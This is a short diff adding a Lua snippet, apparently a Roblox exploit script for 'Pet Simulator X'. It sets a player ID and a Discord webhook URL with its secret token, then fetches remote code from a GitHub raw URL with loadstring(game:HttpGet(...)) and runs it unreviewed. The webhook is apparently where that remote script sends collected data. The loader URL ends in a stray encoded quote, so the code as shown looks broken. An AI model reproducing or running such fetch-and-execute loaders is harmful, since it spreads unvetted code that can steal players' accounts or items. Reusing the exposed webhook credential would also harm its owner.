@@ -1,0 +1,3 @@
+_G.UserID = "1556330745"
+_G.WebHook = "https://discord.com/api/webhooks/1091865737003536394/W2zPgllYFgPHAS1xtvHXty-3gSj8zMmLN0qHewD-uBuV3Ma1-CfJLXee-vmyCBNBqKVs"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/psxscript/main/script.lua%22))()
